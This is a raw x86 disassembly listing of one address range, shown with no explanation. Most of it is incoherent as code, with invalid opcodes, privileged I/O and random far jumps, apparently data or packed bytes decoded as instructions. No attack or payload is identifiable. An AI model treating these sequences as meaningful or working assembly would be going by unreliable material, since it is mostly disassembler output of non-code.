  41635b:	pushf  
  41635c:	imul   BYTE PTR [ebp+0x4507511e]
  416362:	xor    eax,0x36691baf
  416367:	mov    ds:0xf69b67e2,eax
  41636c:	pop    esp
  41636d:	enter  0xaede,0x8a
  416371:	inc    eax
  416372:	mov    eax,0x22a88e42
  416377:	add    ah,bh
  416379:	div    DWORD PTR [ecx+0x3586375a]
  41637f:	push   0x15
  416381:	ror    BYTE PTR [edi],0x7c
  416384:	add    cl,BYTE PTR [esi-0x6f844d80]
  41638a:	nop
  41638b:	repz cmc 
  41638d:	cmp    esi,edx
  41638f:	mov    esi,0x4cf0a405
  416394:	fs push ebx
  416396:	std    
  416397:	mov    ebp,DWORD PTR ds:0xce229a33
  41639d:	push   ss
  41639e:	mov    bl,0x63
  4163a0:	jmp    0x4163d9
  4163a2:	or     DWORD PTR [edi-0x1eed561a],ebp
  4163a8:	pusha  
  4163a9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4163aa:	xchg   ebp,eax
  4163ab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4163ac:	loopne 0x416422
  4163ae:	sbb    al,0xf2
  4163b0:	dec    ebx
  4163b1:	sbb    dl,BYTE PTR [esi-0x422c59b2]
  4163b7:	inc    ebp
  4163b8:	add    ah,BYTE PTR [ebp+0x47]
  4163bb:	jge    0x416391
  4163bd:	push   ebx
  4163be:	push   0xffffffe1
  4163c0:	add    eax,0x78c9f2ad
  4163c5:	xor    ecx,DWORD PTR es:[ecx-0x7d]
  4163c9:	scas   eax,DWORD PTR es:[edi]
  4163ca:	mov    ds:0xedd7f483,al
  4163cf:	mov    edi,0x66d201fa
  4163d4:	bound  ecx,QWORD PTR [ebp+eiz*8+0x79460cdc]
  4163db:	retf   0xc49e
  4163de:	popf   
  4163df:	mov    cl,BYTE PTR [ebp-0x28633b7c]
  4163e5:	lods   eax,DWORD PTR ds:[esi]
  4163e6:	mov    al,0xea
  4163e8:	int    0x70
  4163ea:	mov    edi,0xb6997d88
  4163ef:	stos   DWORD PTR es:[edi],eax
  4163f0:	icebp  
  4163f1:	sub    dh,BYTE PTR [ecx]
  4163f3:	sbb    BYTE PTR [esi-0x5c],bh
  4163f6:	xchg   edx,eax
  4163f7:	in     al,0xc6
  4163f9:	lock mov BYTE PTR [eax+0x4a],bl
  4163fd:	cmp    al,0xfd
  4163ff:	lea    edx,[edx+ebx*4-0x2e46fb87]
  416406:	pop    ebx
  416407:	fs mov al,0x76
  41640a:	imul   BYTE PTR [ebx+0x5279a653]
  416410:	cmp    dl,ah
  416412:	xlat   BYTE PTR ds:[ebx]
  416413:	mov    esp,0xbd53ac10
  416418:	clc    
  416419:	dec    ebp
  41641a:	in     eax,dx
  41641b:	or     eax,0x7c93b1ed
  416420:	sub    bl,cl
  416422:	pop    ss
  416423:	push   ebx
  416424:	lods   eax,DWORD PTR ds:[esi]
  416425:	in     eax,dx
  416426:	cmp    eax,0x802f3f23
  41642b:	jmp    0x415d47f
  416430:	pushf  
  416431:	or     eax,0x8efc35ba
  416436:	in     eax,0x71
  416438:	jmp    0x4164a4
  41643a:	cmp    edi,DWORD PTR [esi]
  41643c:	mov    al,ds:0x7936fa35
  416441:	jmp    0x416442
  416443:	and    eax,0x952636c
  416448:	or     eax,ecx
  41644a:	call   0x1e7c9d58
  41644f:	cmp    eax,0x6f01a81b
  416454:	cdq    
  416455:	rol    DWORD PTR [edx-0x2e],1
  416458:	xchg   esp,eax
  416459:	lahf   
  41645a:	scas   al,BYTE PTR es:[edi]
  41645b:	and    ecx,DWORD PTR [edi]
  41645d:	lods   eax,DWORD PTR ds:[esi]
  41645e:	mov    al,0xfb
  416460:	fdiv   QWORD PTR [edx-0x3f]
  416463:	repz dec ebp
  416465:	jnp    0x4164b0
  416467:	test   dh,dh
  416469:	imul   eax,DWORD PTR [eax+edi*8+0x54bc4aee],0x53
  416471:	add    al,0xe2
  416473:	retf   0x1b64
  416476:	std    
  416477:	mov    BYTE PTR [esi-0x123e66d1],bl
  41647d:	js     0x41644a
  41647f:	mul    DWORD PTR [edx]
  416481:	push   edx
  416482:	inc    eax
  416483:	pop    es
  416484:	fidiv  DWORD PTR [eax]
  416486:	lods   eax,DWORD PTR ds:[esi]
  416487:	adc    esi,DWORD PTR [edi]
  416489:	jo     0x416485
  41648b:	mul    DWORD PTR [ebp+ecx*4-0x101d3b36]
  416492:	ss fstp st(5)
  416495:	xchg   esi,eax
  416496:	pop    ds
  416497:	das    
  416498:	dec    ecx
  416499:	outs   dx,DWORD PTR ds:[esi]
  41649a:	or     esp,DWORD PTR [edi-0x3c]
  41649d:	repnz inc esp
  41649f:	mov    BYTE PTR [edi+0x57],ch
  4164a2:	aas    
  4164a3:	icebp  
  4164a4:	dec    edx
  4164a5:	popf   
  4164a6:	adc    DWORD PTR [ebp+0x6e],esi
  4164a9:	test   bh,cl
  4164ab:	adc    BYTE PTR [ebp-0x67a0beb3],0x71
  4164b2:	sub    DWORD PTR [ebp+0x34],ecx
  4164b5:	int    0x3d
  4164b7:	mov    edx,0x454637d9
  4164bc:	xor    ch,dh
  4164be:	lock mov ebp,0x23c12f66
  4164c4:	add    DWORD PTR [esi-0x482219a0],ecx
  4164ca:	(bad)  
  4164cb:	mov    bl,0x28
  4164cd:	sbb    ecx,DWORD PTR [ebx-0x64aa0a3]
  4164d3:	int    0x31
  4164d5:	ja     0x416486
  4164d7:	stos   BYTE PTR es:[edi],al
  4164d8:	aaa    
  4164d9:	pop    ss
  4164da:	iret   
  4164db:	push   es
  4164dc:	addr16 inc esi
  4164de:	cmp    ebp,ecx
  4164e0:	pop    edx
  4164e1:	cwde   
  4164e2:	retf   0x53bf
  4164e5:	fs mov dh,0xe1
  4164e8:	aaa    
  4164e9:	inc    edi
  4164ea:	push   0x5ae3b749
  4164ef:	out    0x8e,eax
  4164f1:	mov    DWORD PTR [ebx-0x58],esp
  4164f4:	repz jne 0x4164b5
  4164f7:	icebp  
  4164f8:	ins    DWORD PTR es:[edi],dx
  4164f9:	push   ds
  4164fa:	lods   al,BYTE PTR ds:[esi]
  4164fb:	mov    esp,0x7e8ca8e1
  416500:	jne    0x4164a4
  416502:	mov    al,0xbc
  416504:	dec    edx
  416505:	popf   
  416506:	call   0x8d7d:0x349c18b1
  41650d:	test   eax,0xb0daac9b
  416512:	test   al,0xd1
  416514:	shr    BYTE PTR [edx],1
  416516:	jmp    0xc4efa297
  41651b:	sub    al,0x64
  41651d:	xchg   ebx,eax
  41651e:	mov    ds:0xf0583e54,al
  416523:	clc    
  416524:	popf   
  416525:	das    
  416526:	shl    edi,1
  416528:	and    ah,BYTE PTR [eax]
  41652a:	or     eax,0xe9642eb1
  41652f:	stc    
  416530:	aad    0x8f
  416532:	mov    ds:0x8e56a4a6,al
  416537:	test   al,0xc2
  416539:	aas    
  41653a:	mov    bh,0xf
  41653c:	fisttp WORD PTR [eax+0x5e202cb9]
  416542:	or     DWORD PTR [eax+0x20],esp
  416545:	inc    ecx
  416546:	ret    0x6163
  416549:	ins    BYTE PTR es:[edi],dx
  41654a:	push   0x89656f02
  41654f:	mov    ecx,0x383829f8
  416554:	test   al,0xb8
  416556:	mov    bh,0x94
  416558:	push   edx
  416559:	dec    edx
  41655a:	xchg   esi,eax
  41655b:	xor    cl,BYTE PTR [ebx-0x71b40b9f]
  416561:	mov    ebx,0x1bf846a3
  416566:	out    0x38,eax
  416568:	fbstp  TBYTE PTR [ecx-0x3a478dcf]
  41656e:	fwait
  41656f:	(bad)  
  416570:	repz jecxz 0x416529
  416573:	enter  0x5e50,0x68
  416577:	sbb    edi,ecx
  416579:	pop    esi
  41657a:	pop    ss
  41657b:	mov    esi,0x69add89a
  416580:	retf   
  416581:	in     eax,0xc7
  416583:	jp     0x4165ee
  416585:	call   0x3e6937bb
  41658a:	mov    edx,0xc59e1f04
  41658f:	jae    0x416585
  416591:	mov    BYTE PTR ds:[ecx],cl
  416594:	mov    bl,0xfd
  416596:	xlat   BYTE PTR ds:[ebx]
  416597:	sahf   
  416598:	dec    ecx
  416599:	jge    0x416561
  41659b:	js     0x4165d7
  41659d:	pop    es
  41659e:	xor    edx,edx
  4165a0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4165a1:	pop    es
  4165a2:	retf   0xca8b
  4165a5:	push   ecx
  4165a6:	add    cl,dh
  4165a8:	rcr    DWORD PTR [ecx],0xde
  4165ab:	retf   
  4165ac:	mov    eax,cs:0x76e00802
  4165b2:	or     esp,ecx
  4165b4:	(bad)  
  4165b5:	xchg   edi,eax
  4165b6:	leave  
  4165b7:	daa    
  4165b8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4165b9:	add    BYTE PTR [eax],dh
  4165bb:	push   ebx
  4165bc:	jns    0x41661b
  4165be:	repz sub al,0x75
  4165c1:	mov    ch,0x5f
  4165c3:	mov    edx,0x1b061085
  4165c8:	xchg   esp,eax
  4165c9:	aam    0x13
  4165cb:	mov    bl,0xbd
  4165cd:	mov    al,ds:0x1385c363
  4165d2:	pop    esi
  4165d3:	or     eax,0x19301b2d
  4165d8:	mov    dh,BYTE PTR [edx-0x50fff3e8]
  4165de:	in     eax,0x49
  4165e0:	add    edx,ebp
  4165e2:	fisubr WORD PTR [edi-0x21979a47]
  4165e8:	pop    ds
  4165e9:	cmp    dh,BYTE PTR [eax-0x1]
  4165ec:	sahf   
  4165ed:	lods   eax,DWORD PTR ds:[esi]
  4165ee:	daa    
  4165ef:	inc    ebx
  4165f0:	xchg   ecx,eax
  4165f1:	(bad)  
  4165f2:	repz cmp al,0x2a
  4165f5:	adc    eax,0x48322f69
  4165fa:	les    edx,FWORD PTR [esi-0x2b55b52]
  416600:	jge    0x41666d
  416602:	mov    al,ds:0x1f935c61
  416607:	push   ebp
  416608:	cmp    dh,BYTE PTR [esi]
  41660a:	mov    dh,0xb2
  41660c:	shl    DWORD PTR [edi+ebx*4-0x43d04638],0xcc
  416614:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416615:	xchg   edx,eax
  416616:	adc    ch,BYTE PTR [edi+0xeb04187]
  41661c:	mov    BYTE PTR [edi+eiz*2+0x409386d6],cl
  416623:	inc    esi
  416624:	sti    
  416625:	dec    eax
  416626:	not    ch
  416628:	das    
  416629:	popf   
  41662a:	scas   eax,DWORD PTR es:[edi]
  41662b:	enter  0xb464,0xc7
  41662f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416630:	in     al,dx
  416631:	pushf  
  416632:	mov    ebx,0x9d71b883
  416637:	addr16 loopne 0x4165f1
  41663a:	fdivr  QWORD PTR [edx-0x5249b290]
  416640:	gs pushf 
  416642:	jmp    0xb234:0xb30d638d
  416649:	push   ss
  41664a:	jmp    0x91ac4531
  41664f:	cmp    ah,BYTE PTR [edi+0xbfd4803]
  416655:	fwait
  416656:	xor    DWORD PTR [ecx+0x6c1c8488],esi
  41665c:	inc    ebp
  41665d:	or     edi,DWORD PTR [esi]
  41665f:	xchg   edx,eax
  416660:	bound  esp,QWORD PTR [esi]
  416662:	neg    BYTE PTR [eax+0x12]
  416665:	loop   0x416667
  416667:	inc    edi
  416668:	dec    esi
  416669:	mov    ds:0xa7a8e84c,eax
  41666e:	shl    DWORD PTR [ecx+0x37],0x22
  416672:	outs   dx,BYTE PTR ds:[esi]
  416673:	sbb    al,0xff
  416675:	or     DWORD PTR [edi],edi
  416677:	cdq    
  416678:	fnstcw WORD PTR [ecx+eiz*8-0x6d]
  41667c:	add    DWORD PTR [edi-0x1d29e24],esp
  416682:	mov    DWORD PTR [edi+0x22],ebx
  416685:	mov    ds:0x9600b48c,al
  41668a:	push   ecx
  41668b:	stos   BYTE PTR es:[edi],al
  41668c:	pop    esp
  41668d:	into   
  41668e:	sub    esp,DWORD PTR [edi+0x218b1b39]
  416694:	mov    al,0xbb
  416696:	(bad)  
  416697:	jnp    0x4166c7
  416699:	xchg   esp,eax
  41669a:	jmp    0x416692
  41669c:	arpl   WORD PTR [esi+0x42],bx
  41669f:	(bad)  
  4166a0:	popf   
  4166a1:	int3   
  4166a2:	push   esp
  4166a3:	aas    
  4166a4:	inc    edx
  4166a5:	xor    al,0xfd
  4166a7:	inc    ecx
  4166a8:	adc    al,0xa2
  4166aa:	aad    0x2f
  4166ac:	sub    eax,0x6a79935
  4166b1:	dec    ebp
  4166b2:	xchg   edx,eax
  4166b3:	nop
  4166b4:	fwait
  4166b5:	jae    0x4166be
  4166b7:	sub    DWORD PTR [eax+0x2e0e2da4],esp
  4166bd:	imul   esi,DWORD PTR [ecx+0x20],0xc7882600
  4166c4:	enter  0x157,0xa
  4166c8:	test   DWORD PTR [eax],0x5671e16f
  4166ce:	xchg   esi,eax
  4166cf:	add    DWORD PTR [eax-0x1e],ebx
  4166d2:	scas   eax,DWORD PTR es:[edi]
  4166d3:	shl    BYTE PTR [edx],cl
  4166d5:	out    dx,al
  4166d6:	fmul   st(5),st
  4166d8:	push   edx
  4166d9:	jbe    0x41670f
  4166db:	clc    
  4166dc:	sub    eax,0xe93c9dfa
  4166e1:	cmp    BYTE PTR [edx+0x23a1e26a],0x73
  4166e8:	xor    BYTE PTR [edi],bl
  4166ea:	inc    esi
  4166eb:	sar    BYTE PTR [ecx+eiz*2],1
  4166ee:	pop    esi
  4166ef:	(bad)  
  4166f0:	fild   QWORD PTR [edx-0x36d1bcbc]
  4166f6:	pop    ebx
  4166f7:	out    dx,al
  4166f8:	pop    ebx
  4166f9:	lods   eax,DWORD PTR ds:[esi]
  4166fa:	enter  0x4e49,0x33
  4166fe:	in     al,0x8e
  416700:	sbb    DWORD PTR [ebp+0x11],esi
  416703:	sti    
  416704:	pop    esi
  416705:	dec    edi
  416706:	into   
  416707:	jge    0x4166d7
  416709:	das    
  41670a:	jp     0x416736
  41670c:	pusha  
  41670d:	mov    bl,0x55
  41670f:	retf   
  416710:	ret    
  416711:	and    eax,0xe24ed0f4
  416716:	mov    esp,0xaf6ba0a5
  41671b:	push   ds
  41671c:	inc    ebp
  41671d:	xor    dl,BYTE PTR [ecx+0x68]
  416720:	hlt    
  416721:	mov    bh,0x9e
  416723:	pop    ebx
  416724:	pop    ecx
  416725:	cmp    cl,BYTE PTR [ebx]
  416727:	sahf   
  416728:	adc    ebp,DWORD PTR [eax]
  41672a:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  41672c:	xchg   ecx,eax
  41672d:	push   0x731f8c20
  416732:	mov    al,ds:0x2232cd4d
  416737:	mov    ebp,esp
  416739:	jecxz  0x4167a4
  41673b:	imul   ebp,ebp,0xd16ff6b1
  416741:	nop
  416742:	xor    DWORD PTR [ebp-0x688770f0],ecx
  416748:	push   0x4497edf9
  41674d:	xchg   esp,edi
  41674f:	and    dh,BYTE PTR [ebp-0x37]
  416752:	rcl    BYTE PTR ds:0x9742b605,0xc
  416759:	add    eax,0xaa8c24c8
  41675e:	jns    0x41673c
  416760:	adc    eax,0x438a9f13
  416765:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416766:	mov    ebx,0xf5d9f6ae
  41676b:	push   eax
  41676c:	mov    ch,0x9b
  41676e:	jmp    0xb49ce57e
  416773:	or     ebx,ebx
  416775:	xor    DWORD PTR [esi],0x9225f53a
  41677b:	sbb    eax,0x4251cdf6
  416780:	ror    BYTE PTR [ecx+0x7d0ee7a1],0xbd
  416787:	out    dx,eax
  416788:	(bad)  
  416789:	in     al,0xd2
  41678b:	xchg   ebp,eax
  41678c:	mov    ebx,0x21628dbe
  416791:	push   0xffffffa3
  416793:	clc    
  416794:	mov    ebx,DWORD PTR [ecx-0x384594cb]
  41679a:	jl     0x416793
  41679c:	loope  0x4167ad
  41679e:	mov    ebx,0xf75c7e3f
  4167a3:	add    eax,0xbf6fa279
  4167a8:	or     cl,BYTE PTR [edi+esi*1]
  4167ab:	std    
  4167ac:	pop    ecx
  4167ad:	mov    dl,0xf5
  4167af:	in     al,dx
  4167b0:	fsub   DWORD PTR [esi-0x75]
  4167b3:	mov    bl,BYTE PTR [edx+0x663d47d6]
  4167b9:	cmp    ah,BYTE PTR [edi]
  4167bb:	fstp   TBYTE PTR [esi+0x7e]
  4167be:	xor    DWORD PTR cs:[edi+0x35],esp
  4167c2:	sbb    BYTE PTR [esi+0x63],cl
  4167c5:	fild   QWORD PTR [edx+0x7a]
  4167c8:	and    dl,BYTE PTR [eax]
  4167ca:	jnp    0x4167a4
  4167cc:	dec    esi
  4167cd:	fistp  QWORD PTR [eax]
  4167cf:	or     DWORD PTR [edx-0x754d3c3a],ecx
  4167d5:	dec    ebp
  4167d6:	bound  ebp,QWORD PTR [edx-0x63]
  4167d9:	retf   
  4167da:	pcmpeqb mm2,mm5
  4167dd:	nop
  4167de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4167df:	fs mov ebx,0x18f14e22
  4167e5:	not    DWORD PTR [edx+0x2e6d28ec]
  4167eb:	xchg   ah,al
  4167ed:	jmp    FWORD PTR [edx-0x5383b6a2]
  4167f3:	loop   0x416861
  4167f5:	jne    0x41684b
  4167f7:	inc    esp
  4167f8:	xchg   edi,eax
  4167f9:	scas   eax,DWORD PTR es:[edi]
  4167fa:	mov    eax,0xbf34e25
  4167ff:	fidiv  WORD PTR [edi]
  416801:	pop    eax
  416802:	popa   
  416803:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416804:	and    bh,BYTE PTR [esi]
  416806:	push   ebp
  416807:	aas    
  416808:	fistp  DWORD PTR [ecx+edx*4]
  41680b:	shl    BYTE PTR [ebp-0x16],cl
  41680e:	fidiv  WORD PTR [eax]
  416810:	mov    edi,0x1ec6719b
  416815:	repz sub dh,BYTE PTR [ebp+0x6c]
  416819:	pusha  
  41681a:	in     al,dx
  41681b:	inc    esi
  41681c:	jno    0x41681d
  41681e:	add    al,0x13
  416820:	int    0xeb
  416822:	(bad)  
  416824:	test   cl,cl
  416826:	scas   eax,DWORD PTR es:[edi]
  416827:	test   al,0x11
  416829:	in     al,0x1e
  41682b:	push   esi
  41682c:	mov    edx,0x82a03924
  416831:	inc    eax
  416832:	enter  0x499b,0x83
  416836:	adc    cl,ch
  416838:	pop    ecx
  416839:	sar    DWORD PTR [esi],cl
  41683b:	lods   al,BYTE PTR ds:[esi]
  41683c:	icebp  
  41683d:	inc    edx
  41683e:	fsub   st,st(6)
  416840:	inc    esi
  416841:	adc    DWORD PTR [ebx+eax*1-0x1d],ebx
  416845:	aad    0x3d
  416847:	in     eax,0x24
  416849:	fdiv   QWORD PTR [ecx-0x3b]
  41684c:	add    al,0x77
  41684e:	aas    
  41684f:	or     DWORD PTR [edx],eax
  416851:	sub    al,0x9
  416853:	mov    ebp,DWORD PTR [ebx+edi*8-0x67]
  416857:	dec    esi
  416858:	push   esp
  416859:	repnz and al,dh
  41685c:	leave  
  41685d:	sbb    eax,0x693c4106
  416862:	stos   BYTE PTR es:[edi],al
  416863:	idiv   DWORD PTR [ebx+0x58eaa3a8]
  416869:	(bad)  [ecx-0x5ba008b1]
  41686f:	mov    dh,0xd4
  416871:	inc    edi
  416872:	mov    ch,0x22
  416874:	fistp  QWORD PTR [ebx-0x22]
  416877:	sub    ecx,DWORD PTR [edx*2-0x389ec1a7]
  41687e:	cmp    DWORD PTR [edx],edi
  416880:	test   eax,0x61067ab8
  416885:	dec    ebx
  416886:	xchg   edx,eax
  416887:	push   ss
  416888:	and    DWORD PTR [esi-0x15],ecx
  41688b:	js     0x4168d9
  41688d:	iret   
  41688e:	jl     0x41681c
  416890:	sub    eax,0xfaf2d23d
  416895:	cmp    bl,BYTE PTR ds:0x87b41350
  41689b:	out    dx,eax
  41689c:	jae    0x4168cf
  41689e:	in     al,0x52
  4168a0:	sub    eax,0x48908df6
  4168a5:	imul   edi,DWORD PTR [ecx-0x39858250],0xffffffb1
  4168ac:	sub    eax,0xa855894f
  4168b1:	mov    edx,DWORD PTR [ebp+0x8]
  4168b4:	mov    ebx,DWORD PTR [ebp-0x54]
  4168b7:	add    edx,0x64f893
  4168bd:	or     edx,ebx
  4168bf:	mov    DWORD PTR [ebp-0x54],edx
  4168c2:	mov    edx,DWORD PTR [ebp+0x8]
  4168c5:	jmp    0x418c66
  4168ca:	push   edi
  4168cb:	gs stos DWORD PTR es:[edi],eax
  4168cd:	cwde   
  4168ce:	jnp    0x416868
  4168d0:	inc    edi
  4168d1:	jns    0x4168fa
  4168d3:	in     eax,dx
  4168d4:	fistp  DWORD PTR [eax+0x52]
  4168d7:	stos   DWORD PTR es:[edi],eax
  4168d8:	sub    eax,0x7d3bbe4b
  4168dd:	jp     0x4168dd
  4168df:	pop    edi
  4168e0:	jp     0x41695c
  4168e2:	aad    0xc
  4168e4:	(bad)  
  4168e5:	ror    BYTE PTR [esi-0x35],0xe4
  4168e9:	and    eax,0xd761ce50
  4168ee:	pop    esi
  4168ef:	mov    cl,0x8e
  4168f1:	add    ecx,ebx
  4168f3:	or     eax,0x179aa546
  4168f8:	and    ebp,DWORD PTR [esi]
  4168fa:	(bad)  
  4168fb:	cmp    eax,0x5ad9728f
  416900:	mov    esp,0x1b603bf0
  416905:	mov    cl,0xba
  416907:	mov    eax,edi
  416909:	cli    
  41690a:	call   0x1815:0x64f08e8
  416911:	sbb    DWORD PTR [esi],0x931bc3be
  416917:	out    0x1,eax
  416919:	sub    bl,0x4b
  41691c:	sub    BYTE PTR [ebx*1-0x59120fbe],0x4b
  416924:	mov    ebx,0xe0c19cc7
  416929:	mov    BYTE PTR [ebp+0x7931e41a],dl
  41692f:	mov    ebp,0x2381accc
  416934:	pusha  
  416935:	nop
  416936:	or     esp,DWORD PTR [eax-0x74bcac1]
  41693c:	cmc    
  41693d:	or     eax,0xb42d505a
  416942:	inc    ecx
  416943:	cld    
  416944:	fs ror ch,0x5b
  416948:	je     0x4169a3
  41694a:	and    DWORD PTR [ecx+0x23d0891e],ebx
  416950:	rcl    DWORD PTR [eax],1
  416952:	mov    WORD PTR [ebx],ds
  416954:	in     al,dx
  416955:	lea    ebp,[edx+0x3919df42]
  41695b:	add    eax,0x15ff96fc
  416960:	push   edx
  416961:	cmp    BYTE PTR [edi+eax*2+0x55],dh
  416965:	bound  ebp,QWORD PTR [ecx-0x79f7a178]
  41696b:	sbb    al,0x41
  41696d:	jns    0x416911
  41696f:	push   edi
  416970:	daa    
  416971:	adc    BYTE PTR [ebx-0x2905de9c],0x0
  416978:	in     eax,dx
  416979:	mov    ch,0x29
  41697b:	sar    ecx,1
  41697d:	aas    
  41697e:	or     BYTE PTR [edx],bl
  416980:	aaa    
  416981:	ret    0xe89f
  416984:	popa   
  416985:	dec    ecx
  416986:	or     ebx,esi
  416988:	sbb    al,0xad
  41698a:	pop    esi
  41698b:	dec    esi
  41698c:	xchg   DWORD PTR [ecx+0xb],ecx
  41698f:	adc    dl,BYTE PTR [edx-0x376b6e4f]
  416995:	and    ebp,DWORD PTR [eax-0x543d56c2]
  41699b:	cs popf 
  41699d:	das    
  41699e:	icebp  
  41699f:	push   ebx
  4169a0:	or     cl,bh
  4169a2:	aam    0x3b
  4169a4:	adc    BYTE PTR [ebx],bh
  4169a6:	fsub   QWORD PTR [edx-0x74dcbcf8]
  4169ac:	lock xchg DWORD PTR [ebp+0x6c1b582c],esp
  4169b3:	xchg   ebx,eax
  4169b4:	jle    0x41695d
  4169b6:	jnp    0x41698b
  4169b8:	sub    dh,bh
  4169ba:	xchg   ebp,eax
  4169bb:	cmp    eax,0x5c747b22
  4169c0:	xchg   BYTE PTR [esi-0x61],cl
  4169c3:	cli    
  4169c4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4169c5:	xor    ah,cl
  4169c7:	dec    edi
  4169c8:	sbb    al,BYTE PTR [ecx+edx*1+0x15]
  4169cc:	pop    edi
  4169cd:	adc    al,0x80
  4169cf:	sbb    al,0x23
  4169d1:	mov    bh,BYTE PTR [eax+0x50]
  4169d4:	push   eax
  4169d5:	jne    0x416a28
  4169d7:	nop
  4169d8:	adc    eax,0xa8bebd5f
  4169dd:	push   DWORD PTR [edx+0x24af66e8]
  4169e3:	outs   dx,BYTE PTR ds:[esi]
  4169e4:	les    edx,FWORD PTR [ebp+0x318577c9]
  4169ea:	out    dx,al
  4169eb:	cmp    esi,DWORD PTR [edx]
  4169ed:	out    0xa9,eax
  4169ef:	or     BYTE PTR [edx+0x11],dh
  4169f2:	mov    dh,0x7b
  4169f4:	ret    0xcb01
  4169f7:	sub    eax,0x37d5e833
  4169fc:	aas    
  4169fd:	das    
  4169fe:	jb     0x416a41
  416a00:	je     0x416a03
  416a02:	adc    al,0xe4
  416a04:	in     al,0xf
  416a06:	fnstsw WORD PTR [esi+0x52]
  416a09:	xor    BYTE PTR [esp+edi*1+0xb1755d4],ah
  416a10:	sbb    DWORD PTR [ebx],esp
  416a12:	(bad)  
  416a13:	shrd   DWORD PTR [ebx+ebx*8],esi,cl
  416a17:	adc    al,0x4c
  416a19:	adc    ebp,DWORD PTR [ebx+0x76104e23]
  416a1f:	jo     0x4169f0
  416a21:	sti    
  416a22:	push   0xffffffc0
  416a24:	in     eax,0x6f
  416a26:	lock mov cl,bl
  416a29:	in     eax,0xc3
  416a2b:	(bad)  
  416a2c:	out    0x4f,al
  416a2e:	aam    0xb6
  416a30:	sbb    BYTE PTR [ecx],ah
  416a32:	sahf   
  416a33:	shr    BYTE PTR ds:[ebp+0x4b],1
  416a37:	xchg   esi,eax
  416a38:	rcl    ch,0xf4
  416a3b:	xchg   ebx,eax
  416a3c:	and    ebx,ecx
  416a3e:	dec    esp
  416a3f:	out    0xed,eax
  416a41:	out    0xf8,al
  416a43:	inc    ebp
  416a44:	ins    DWORD PTR es:[edi],dx
  416a45:	out    dx,eax
  416a46:	bound  ebp,QWORD PTR [ecx+0x24]
  416a49:	jg     0x416a09
  416a4b:	xor    al,cl
  416a4d:	test   al,0x12
  416a4f:	xlat   BYTE PTR ds:[ebx]
  416a50:	daa    
  416a51:	push   ebp
  416a52:	push   ecx
  416a53:	dec    esi
  416a54:	add    al,0xba
  416a56:	xchg   ebx,ecx
  416a58:	pop    ecx
  416a59:	jge    0x4169f4
  416a5b:	js     0x416ab8
  416a5d:	ja     0x416ab3
  416a5f:	jmp    0xb051:0x9fdbe41c
  416a66:	enter  0xd440,0xff
  416a6a:	mov    ah,0xff
  416a6c:	adc    ah,BYTE PTR [esi+eax*4-0x57]
  416a70:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416a71:	mov    edx,0xeec86681
  416a76:	daa    
  416a77:	inc    eax
  416a78:	adc    eax,0x29ca5dd2
  416a7d:	not    BYTE PTR [ecx]
  416a7f:	cmp    BYTE PTR [ebx+0x23],dh
  416a82:	repnz adc BYTE PTR [ebp+ebx*8+0x7e1d2d13],bl
  416a8a:	and    esi,eax
  416a8c:	and    eax,0xfdcfc8d5
  416a91:	ss jg  0x416a74
  416a94:	sub    al,0xd6
  416a96:	lods   al,BYTE PTR ds:[esi]
  416a97:	push   edi
  416a98:	push   esi
  416a99:	cdq    
  416a9a:	cmp    DWORD PTR [eax-0xb23b31f],ebp
  416aa0:	dec    eax
  416aa1:	clc    
  416aa2:	cmp    dh,BYTE PTR [eax+0x63395039]
  416aa8:	les    ebx,FWORD PTR [edx-0x44]
  416aab:	enter  0x933e,0x4f
  416aaf:	mov    BYTE PTR [edx+0x5e04279f],ah
  416ab5:	(bad)  
  416ab6:	and    eax,DWORD PTR [edx]
  416ab8:	mov    ch,0xaa
  416aba:	sbb    cl,BYTE PTR [edx]
  416abc:	mov    dl,BYTE PTR [esi-0x4]
  416abf:	loopne 0x416abe
  416ac1:	aad    0x8b
  416ac3:	dec    edi
  416ac4:	mov    al,0x3b
  416ac6:	sub    BYTE PTR [edi-0x34],bh
  416ac9:	or     bl,ch
  416acb:	(bad)  
  416acc:	sub    esi,DWORD PTR [esi+0x32]
  416acf:	sub    DWORD PTR [ebx-0x4d],0xffffffda
  416ad3:	add    BYTE PTR [ebp+0x6ab39a6e],dh
  416ad9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416ada:	stos   BYTE PTR es:[edi],al
  416adb:	sub    eax,0x976bdc0
  416ae0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416ae1:	imul   edi,DWORD PTR [ecx],0xbad4ff70
  416ae7:	(bad)  
  416ae8:	sbb    ch,bl
  416aea:	in     al,0x1
  416aec:	shr    DWORD PTR [esi],cl
  416aee:	jbe    0x416adb
  416af0:	call   0x7537:0x364c87a6
  416af7:	sbb    DWORD PTR ss:[eax+0x442ab5fb],0x6e
  416aff:	dec    esp
  416b00:	dec    eax
  416b01:	in     eax,dx
  416b02:	xchg   esp,eax
  416b03:	cwde   
  416b04:	in     al,dx
  416b05:	jg     0x416ab4
  416b07:	adc    DWORD PTR [esp+eiz*4+0x87346c0],eax
  416b0e:	js     0x416b32
  416b10:	rol    DWORD PTR [esi],cl
  416b12:	pop    eax
  416b13:	inc    edx
  416b14:	lods   eax,DWORD PTR ds:[esi]
  416b15:	inc    eax
  416b16:	scas   al,BYTE PTR es:[edi]
  416b17:	sti    
  416b18:	add    al,0xdc
  416b1a:	xchg   BYTE PTR [eax-0x45],al
  416b1d:	push   cs
  416b1e:	gs test eax,0xdcf36807
  416b24:	nop
  416b25:	popf   
  416b26:	(bad)  
  416b27:	call   0xe83d:0xdec6baf6
  416b2e:	push   ecx
  416b2f:	push   0xbf4c9736
  416b34:	mov    al,0xd5
  416b36:	mov    ah,0xa1
  416b38:	aam    0xc9
  416b3a:	ror    DWORD PTR [ebx+0x64],cl
  416b3d:	je     0x416b55
  416b3f:	jmp    0x1365:0x5175a8a6
  416b46:	cs mov al,0x19
  416b49:	cli    
  416b4a:	pop    eax
